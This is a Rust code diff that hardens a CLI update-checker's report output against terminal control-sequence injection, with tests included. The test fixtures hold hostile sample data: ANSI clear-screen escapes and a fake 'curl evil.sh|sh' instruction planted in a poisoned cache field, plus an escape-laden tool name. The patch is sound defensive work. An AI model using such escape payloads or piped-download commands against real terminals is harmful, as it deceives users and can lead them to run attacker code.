@@ -1,6 +1,18 @@
 //! Human + JSON output for freshness reports (PRD-057).
+//!
+//! Every attacker-controllable string that reaches stdout — tool
+//! names (from TOML keys), the `installed` version (from a
+//! subprocess we ran on an attacker-named binary), and the
+//! `latest` version (from a cache file that same-uid processes can
+//! poison) — routes through [`redact_for_display`] before hitting
+//! `push_str`/`format!`. That closes the "TTY control-sequence
+//! injection into `jarvy check-updates` output" vector: a hostile
+//! local `jarvy.toml` or a poisoned `~/.jarvy/update-cache.json`
+//! can no longer clear the terminal, spoof a fake update
+//! instruction, or mangle the reader's shell prompt.
 
 use super::checker::{Direction, Report};
+use crate::observability::redact_for_display;
 
 /// One-line summary used by `jarvy setup`'s post-completion banner
 /// and by `--quiet` invocations of `jarvy check-updates`. Returns
@@ -65,10 +77,10 @@ fn render_human(report: &Report, include_unchecked: bool) -> String {
             };
             out.push_str(&format!(
                 "  {name:<20} {installed:<12} {arrow} {latest:<12} ({backend})\n",
-                name = check.tool,
-                installed = check.installed.as_deref().unwrap_or("?"),
+                name = redact_for_display(&check.tool),
+                installed = redact_for_display(check.installed.as_deref().unwrap_or("?")),
                 arrow = arrow,
-                latest = check.latest.as_deref().unwrap_or("?"),
+                latest = redact_for_display(check.latest.as_deref().unwrap_or("?")),
                 backend = check.backend,
             ));
         }
@@ -80,7 +92,7 @@ fn render_human(report: &Report, include_unchecked: bool) -> String {
         for check in &report.errors {
             out.push_str(&format!(
                 "  {} ({}): {}\n",
-                check.tool,
+                redact_for_display(&check.tool),
                 check.backend,
                 check.error_kind.as_deref().unwrap_or("unknown")
             ));
@@ -99,9 +111,15 @@ fn render_human(report: &Report, include_unchecked: bool) -> String {
                 match &skipped.manager {
                     Some(m) => out.push_str(&format!(
                         "  - {} ({}, via {})\n",
-                        skipped.tool, skipped.reason, m
+                        redact_for_display(&skipped.tool),
+                        skipped.reason,
+                        redact_for_display(m)
                     )),
-                    None => out.push_str(&format!("  - {} ({})\n", skipped.tool, skipped.reason)),
+                    None => out.push_str(&format!(
+                        "  - {} ({})\n",
+                        redact_for_display(&skipped.tool),
+                        skipped.reason
+                    )),
                 }
             }
             out.push('\n');
@@ -186,5 +204,57 @@ mod tests {
         assert!(text.contains("brew"));
         assert!(text.contains("rust"));
         assert!(text.contains("rustup"));
+    }
+
+    #[test]
+    fn ansi_control_bytes_in_cache_poisoned_fields_are_redacted() {
+        // Simulate a poisoned cache entry: same-uid process wrote a
+        // `latest` value containing ANSI clear-screen + a fake
+        // instruction. Reporter must render the escape as a printable
+        // `?` sentinel instead of forwarding to the terminal.
+        let mut r = Report::empty();
+        r.updates.push(ToolCheck {
+            tool: "jq".to_string(),
+            backend: "brew".to_string(),
+            installed: Some("1.7.1".to_string()),
+            latest: Some("\x1b[2J\x1b[H*** run curl evil.sh|sh ***".to_string()),
+            error_kind: None,
+            from_cache: true,
+            direction: Direction::Upgrade,
+        });
+        r.summary.tools_checked = 1;
+        r.summary.updates_available = 1;
+        let text = human_with_options(&r, false);
+        assert!(
+            !text.contains('\x1b'),
+            "ESC byte must not survive to stdout: {text:?}"
+        );
+        // Fake-log-injection LF is stripped by redact_for_display too,
+        // but the sentinel `?` replacement should be visible.
+        assert!(
+            text.contains("?[2J"),
+            "expected sentinel-replaced escape marker, got: {text:?}"
+        );
+    }
+
+    #[test]
+    fn hostile_tool_name_from_toml_key_is_redacted() {
+        // Attacker publishes a repo with `[cargo] "\x1b[2Jevil" = "1"`.
+        // Even without the resolver's push_if_safe gate (which refuses
+        // control bytes), the reporter is a defense-in-depth layer.
+        let mut r = Report::empty();
+        r.updates.push(ToolCheck {
+            tool: "evil\x1b[2Jname".to_string(),
+            backend: "cargo".to_string(),
+            installed: Some("1.0.0".to_string()),
+            latest: Some("2.0.0".to_string()),
+            error_kind: None,
+            from_cache: false,
+            direction: Direction::Upgrade,
+        });
+        r.summary.tools_checked = 1;
+        r.summary.updates_available = 1;
+        let text = human_with_options(&r, false);
+        assert!(!text.contains('\x1b'), "raw ESC must not reach output");
     }
 }
